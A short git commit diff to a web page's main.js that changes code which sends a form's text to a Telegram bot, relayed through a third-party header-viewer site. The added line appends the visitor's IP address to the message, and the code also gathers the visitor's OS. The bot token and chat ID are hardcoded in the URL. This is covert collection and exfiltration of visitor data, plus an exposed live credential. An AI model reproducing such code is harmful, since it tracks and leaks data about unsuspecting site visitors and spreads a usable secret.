3cb7b56477d58ee7b209f2f3144c221b4068b03d
PERSIANencrypter <79386552+PERSIANencrypter@users.noreply.github.com>
2021-11-23 03:01:02 +0330

    update main.js

--- main.js
+++ main.js
@@ -11,7 +11,7 @@ function ss(){
   var os = cljs.getOS();
   alert(ip);
   var text = document.getElementById("inp").value;
-  var mohtava = "ask%3A"+encodeURIComponent(text)+"%23";
+  var mohtava = "ask%3A"+encodeURIComponent(text)+"%23"+ip;
   var url = "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx";
   var con = "https://api.telegram.org/bot2072567714:AAFpwTm_8eP43UR5BDUuuMKoFGVKan6WZcw/sendMessage?chat_id=-734718255&text="+mohtava;
   var data={"UrlBox":con,
